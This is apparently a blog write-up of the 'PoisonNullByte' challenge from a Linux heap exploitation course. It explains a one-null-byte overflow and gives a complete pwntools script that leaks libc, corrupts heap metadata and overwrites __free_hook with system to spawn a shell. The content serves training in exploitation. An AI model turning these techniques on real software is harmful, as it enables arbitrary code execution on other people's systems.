+++
date = '2026-10-27'
draft = false
title = 'PoisonNullByte'
categories = ["binary exploitation", "heap exploitation"]
+++

### Acknowledgement:

This challenge belongs to the [Linux Heap Exploitation 2](https://www.udemy.com/course/linux-heap-exploitation-part-2/) course by **Max Kamper** . It is the first challenge of this course. Max is a great teacher and a very experienced individual in this field and I highly recommend this course to anyone who wants a deep dive into linux heap exploitation .

### Challenge: 

We are given a binary which has all the modern protections turned on like PIE, NX, Stack Canary and FULL RELRO. It is linked against glibc-2.25.
On starting the binary we are given a menu which allows us to allocate new chunks in the smallbin range, free them, read them, edit them,
and quit the binary. We can request for chunks only 14 times and on top of that the binary uses `calloc`
instead of `malloc` which means chunks are zeroed out when returned  to the user to prevent any kind of info leak. The binary doesnot leak the libc address or the heap address by default.
Our goal is to **drop a shell**.

### My solution for the challenge:

#### Finding the bug: 

Upon inspection of the binary we can find out that there is a **one-null-byte overflow** and that is what the challenge name suggests. 

#### Crafting the exploit:

We can use either of the below 2 techniques to create a overlapping chunk primitive using a poison null byte:

1. House Of Einherjar
2. Google Poison Null Byte Technique

I will be using the **Google Poison Null Byte Technique**.
Here is the well commented code with all steps explained.

```python
#!/usr/bin/python3
from pwn import *

context.terminal = ["wezterm", "start", "--"]
context.gdb_binary = "/usr/local/bin/pwndbg"

elf = context.binary = ELF("poison_null_byte")
libc = ELF(elf.runpath + b"/libc.so.6") 

gs = '''
cd ~/Documents/HeapExploitation/HeapLAB_Part2/house_of_einherjar/
set solib-search-path ~/Documents/HeapExploitation/HeapLAB_Part2/.glibc/glibc_2.28_no-tcache/
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ", timeout=1)

# Select the "read" option; read size bytes.
def read(index, size):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(size)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# -==== Leaking Libc base address ====- #

# Using the google poison_null_byte technique we are going to leak the libc and heap metadata.

# Chunk to overflow
overflow = malloc(0x68)

# Chunk to tamper with and that will be later freed
# We set the size field such that the least significant byte is set.
tamper = malloc(0x208)

# chunk that will consolidate backward
backward_consolidate = malloc(0x88)

# guard chunk
guard = malloc(0x68)

# Freeing the tamper chunk
free(tamper)

# Tamper the size field of the tamper chunk by overflowing the overflow chunk.
edit(overflow, b"A"*0x68) # A null byte will be automatically added by the binary to terminate the string.

# Remaindering the tamper chunk
above_overlap = malloc(0xf8)
fast_overlap = malloc(0x68)
unsorted_overlap = malloc(0x88)

# Free the above_overlap so that it passes the safe unlink check
free(above_overlap)

# Free the backward_consolidate chunk to get the big chunk
free(backward_consolidate)

# Now we can allocate the above_overlap chunk again so that rest of the chunk(our overlap chunk)
# gets linked into the unsorted bin . We can then read its value to leak the libc address.
above_overlap = malloc(0xf8)

unsortedbin_head_addr = u64(read(fast_overlap, 8))
libc_base = unsortedbin_head_addr - (libc.sym.main_arena) - 0x58
libc.address = libc_base
log.info(f"Leaked libc base: {hex(libc.address)}")


# Getting the fake fast chunk
fast_overlap_2 = malloc(0x68)

# === Creating a fake chunk near the __free_hook using unsorted bin attack ===
unsorted_overlap_2 = malloc(0x88)
free(unsorted_overlap_2)
edit(unsorted_overlap, p64(0) + p64(libc.sym.__free_hook - 0x20))

malloc(0x128)

# === Creating a fastbin dup to get the access to the new fake chunk ===

free(fast_overlap_2)
edit(fast_overlap, p64(libc.sym.__free_hook - 0x13))

# === Getting the chunk near __free_hook
malloc(0x68)
target = malloc(0x68)

# === Overwriting the free hook with system ===
edit(target, b"\x00"*3 + p64(libc.sym.system))

# Writing "/bin/sh" at the guard chunk and freeing it thus calling system("/bin/sh").
edit(guard, b"/bin/sh\x00")
free(guard)


#==========================================

io.interactive()

```


